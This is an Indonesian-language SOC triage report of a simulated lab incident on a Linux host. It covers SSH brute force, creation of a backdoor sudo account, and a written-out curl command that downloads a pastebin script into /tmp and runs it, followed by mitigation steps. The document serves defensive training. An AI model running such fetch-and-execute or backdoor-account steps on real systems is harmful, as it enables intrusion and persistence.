# Laporan Insiden Keamanan (Triage Report): INC-2026-001

## 1. Informasi Insiden
* **Tanggal/Waktu Investigasi:** 1 Maret 2026
* **Host yang Terdampak:** `altocumulus` (Ubuntu Linux)
* **Sumber Log:** `/var/log/auth.log`, `/var/log/syslog`
* **Alat Analisis:** Splunk Enterprise SIEM
* **Tingkat Keparahan (Severity):** TINGGI (High)

## 2. Ringkasan Eksekutif
Telah terdeteksi rangkaian aktivitas tidak biasa pada host Linux `altocumulus` yang disimulasikan sebagai skenario pembelajaran SOC. Aktivitas mencakup percobaan login SSH berulang, pembuatan akun baru dengan hak istimewa, dan eksekusi skrip dari direktori temporer.

Walaupun insiden ini terjadi dalam lingkungan lab, pola aktivitas yang diamati merepresentasikan teknik yang umum digunakan dalam serangan nyata.

## 3. Garis Waktu Serangan & Temuan Teknis
* **Akses Awal (SSH Brute Force):** Sistem *alerting* Splunk menangkap 18 percobaan login yang gagal secara berturut-turut melalui layanan SSH ke akun `hacker` dari alamat IP `127.0.0.1`.
* **Eskalasi Hak Akses & Persistensi:** Setelah mendapatkan akses, penyerang menyalahgunakan hak administrator (`sudo`) untuk membuat akun *backdoor* bernama `sysupdate` dan memasukkannya ke dalam grup `sudo`. Aktivitas ini menciptakan jalur akses ilegal tanpa jejak audit yang sah.
* **Eksekusi Perintah Mencurigakan:** Dengan menggunakan identitas akun `sysupdate` untuk menyembunyikan jejak, penyerang memuat turun skrip dari luar menggunakan perintah `curl -s https://pastebin.com/raw/XYZ123 -o /tmp/update.sh` dan mengeksekusinya di dalam direktori `/tmp`.

## 4. Rekomendasi Mitigasi & Kepatuhan Peraturan (GRC)
Untuk memulihkan sistem dan memastikan kepatuhan terhadap standar keamanan perusahaan, langkah-langkah berikut direkomendasikan:
* **Tindakan Pemulihan Teknis:**
  1. Memblokir alamat IP `127.0.0.1` (atau IP sumber penyerang) pada *firewall* atau *iptables*.
  2. Menonaktifkan dan menghapus akun `sysupdate` dari sistem secara permanen.
* **Tindakan Evaluasi Kepatuhan & Risiko:**
  1. **Audit Hak Akses Utama:** Melakukan peninjauan ulang (*user access review*) terhadap semua akun yang memiliki keistimewaan `sudo`. Hak akses ini harus dibatasi ketat hanya untuk personel yang memiliki otoritas bisnis yang sah.
  2. **Pembaruan Kebijakan:** Menerapkan kebijakan *account lockout* (misalnya: akun terkunci setelah 5 kali gagal login) untuk mencegah otomatisasi serangan *brute force* di masa mendatang.
